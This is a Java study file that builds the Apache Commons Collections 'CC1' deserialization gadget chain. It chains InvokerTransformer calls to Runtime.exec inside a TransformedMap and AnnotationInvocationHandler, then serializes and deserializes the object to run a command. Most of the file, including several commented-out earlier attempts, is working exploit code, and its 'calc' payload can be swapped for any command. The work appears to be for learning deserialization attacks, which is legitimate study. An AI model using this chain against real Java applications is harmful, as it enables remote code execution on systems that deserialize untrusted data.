package top.foreverwl.study.ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import sun.nio.cs.ext.IBM037;
import sun.security.pkcs11.wrapper.CK_AES_CTR_PARAMS;

import javax.management.ObjectName;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC1My {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException {
//        Runtime r=Runtime.getRuntime();//
//        Class cl=r.getClass();//获取大 Class
//        Method method= cl.getMethod("exec", String.class);
//        method.invoke(r,"calc");
//
//        //-------------------------------------------------
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[] {String.class}, new Object[]{"calc"}).transform(r);
//        new InvokerTransformer("exec",new Class[] {String.class}, new Object[]{"calc"}).transform(r);


//        invokerTransformer.transform(r);

//        Method runtime= cl.getMethod("getRuntime");
//        exec.invoke(runtime,"calc.exe");

//        --------------------------------------------------
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[] {String.class}, new Object[]{"calc"});
//        Runtime r=Runtime.getRuntime();//

//        Class runtime=Class.forName("java.lang.Runtime");
//        Method getruntime=runtime.getMethod("getRuntime",null);
//        Method exec=runtime.getDeclaredMethod("exec", String.class);
//        Runtime rt= (Runtime) getruntime.invoke(null,null);
//        exec.invoke(rt,"clac");

//        //获取getRuntime方法
//        Method getruntime= (Method) new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
//        //获取invoke方法
//        Runtime rt= (Runtime) new InvokerTransformer("invoke",new Class[]{String.class,Class[].class},new Object[]{null,null}).transform(getruntime);
//        //执行命令
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"clac"}).transform(rt);

//        Transformer[] transformer = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class},new Object[]{"getRuntime", null}),
//                new InvokerTransformer("invoke", new Class[]{String.class, Object[].class}, new Object[]{null, null}),
//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
//        };
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})

        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
//        chainedTransformer.transform(Runtime.class);

        HashMap<Object, Object> map = new HashMap<>();
//        map.put("test","test");
        map.put("value", "168");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(Target.class, transformedMap);
        serialize(o);
        unserialize("ser.txt");
//        for (Map.Entry entry:transformedMap.entrySet()){
//            System.out.println(entry);
//            entry.setValue(r);
//        }
    }

//    public static void serialize(Object obj) throws IOException {
//        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.txt"));
//        oos.writeObject(obj);
//    }
//
//    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
//        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
//        Object obj = ois.readObject();
//        return obj;
//    }
   public static void serialize(Object object) throws IOException {
       FileOutputStream fileOutputStream = new FileOutputStream("ser.txt");
       ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
       objectOutputStream.writeObject(object);
       System.out.println("1.序列化成功");
}

    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(filename);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println("2.反序列化成功");
    }

}
